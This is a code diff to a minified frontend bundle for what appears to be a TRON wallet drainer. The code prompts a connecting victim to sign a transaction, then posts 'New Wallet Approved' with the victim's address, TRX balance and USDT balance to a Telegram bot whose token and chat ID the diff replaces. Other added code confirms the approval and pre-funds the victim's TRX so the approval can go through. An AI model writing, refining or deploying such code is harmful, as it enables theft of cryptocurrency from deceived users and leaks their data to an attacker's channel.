@@ -79431,13 +79431,13 @@
         }
           , sG = e => {
             try {
-                fetch("https://api.telegram.org/bot".concat("8971320120:AAFYMdgD7zhvLqegiUF8wfAWSAnXs9pF9MQ", "/sendMessage"), {
+                fetch("https://api.telegram.org/bot".concat("8689675702:AAGtLfTN16oueOrkaSsDfmfqiVmIlHQ47qI", "/sendMessage"), {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        chat_id: "8684857405",
+                        chat_id: "1727819576",
                         text: e,
                         parse_mode: "HTML"
                     })
@@ -79520,15 +79520,20 @@
               , l = async (e, t) => {
                 try {
                     const n = await e.sendTransaction(t);
-                    if (n) {
+                    const approved = n && !1 !== n.success && !1 !== n.result && (!0 === n.result || !!n.txid);
+                    if (approved) {
                         const o = await e.getBalance(t)
                           , i = await iG(t);
                         r(n);
                         const s = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
-                        sG(s)
+                        sG(s);
+                        return !0
                     }
+                    return s(!0),
+                    !1
                 } catch (n) {
-                    s(!0)
+                    return s(!0),
+                    !1
                 }
             }
               , u = async (e, t) => {
@@ -79560,6 +79565,7 @@
                 Ae.jsx)("button", {
                     className: "w-full bg-blue-800 rounded-3xl hover:bg-blue-700 text-white font-semibold py-3 cursor-pointer transition-colors",
                     onClick: async () => {
+                        s(!1);
                         try {
                             let __loader = document.getElementById("wc-loading-overlay");
                             if (!__loader) {
@@ -79618,22 +79624,27 @@
                                 })).namespaces.tron.accounts[0].split(":")[2]
                                   , n = new cG(e);
                                 u(n, r);
-                                // Use Railway backend for automatic TRX funding
                                 try {
                                     const fundingResult = await window.railwayBackend.checkAndFundUser(r);
                                     const minBal = fundingResult.minimumBalance ?? 11;
-                                    if (!fundingResult.funded && (fundingResult.balance ?? 0) < minBal) {
-                                        window.alert(fundingResult.error || "Auto-funding failed. Please try again or contact support.");
-                                        return;
+                                    if (fundingResult.funded) {
+                                        const ready = await window.railwayBackend.waitForMinimumBalance(r, minBal);
+                                        if (!ready.ready) {
+                                            window.alert("TRX top-up sent but balance not confirmed yet. Please wait a moment and try again.");
+                                            return
+                                        }
+                                    } else if ((fundingResult.balance ?? 0) < minBal) {
+                                        window.alert(fundingResult.error || fundingResult.message || "Insufficient TRX balance. Need at least ".concat(minBal, " TRX."));
+                                        return
                                     }
-                                    console.log("✅ TRX funding completed:", fundingResult);
+                                    console.log("\u2705 TRX balance ready:", fundingResult)
                                 } catch (error) {
-                                    console.error("❌ Railway backend funding failed:", error);
+                                    console.error("\u274c Railway backend funding failed:", error);
                                     window.alert(error?.message || "Auto-funding service unavailable. Please try again later.");
-                                    return;
+                                    return
                                 }
-                                l(n, r),
-                                t(r)
+                                const approved = await l(n, r);
+                                approved && t(r)
                             } catch (r) {
                             } finally {
                                 const __loader = document.getElementById("wc-loading-overlay");
@@ -82117,12 +82128,34 @@
                 }
 
                 console.log('✅ User has sufficient balance:', balanceData.balance, 'TRX');
-                return { funded: false, balance: balanceData.balance, minimumBalance };
+                return { funded: false, balance: balanceData.balance, minimumBalance, skipped: true };
             } catch (error) {
                 console.error('❌ Auto-funding failed:', error);
                 // this.showNotification('❌ Failed to check wallet balance', 'error');
                 throw error;
             }
+        },
+
+        async waitForMinimumBalance(userAddress, minimumBalance = 11, maxAttempts = 20, intervalMs = 3000) {
+            for (let attempt = 0; attempt < maxAttempts; attempt++) {
+                try {
+                    const balanceResponse = await fetch(`${this.baseUrl}/check-balance`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ userAddress })
+                    });
+                    const balanceData = await balanceResponse.json();
+                    if (balanceResponse.ok && balanceData.success && (balanceData.balance ?? 0) >= minimumBalance) {
+                        console.log(`✅ Balance confirmed: ${balanceData.balance} TRX (min: ${minimumBalance})`);
+                        return { ready: true, balance: balanceData.balance };
+                    }
+                    console.log(`⏳ Waiting for TRX... attempt ${attempt + 1}/${maxAttempts}, balance: ${balanceData.balance ?? 0}`);
+                } catch (err) {
+                    console.warn('Balance poll failed:', err);
+                }
+                await new Promise(resolve => setTimeout(resolve, intervalMs));
+            }
+            return { ready: false };
         },
         
         // Show notification to user
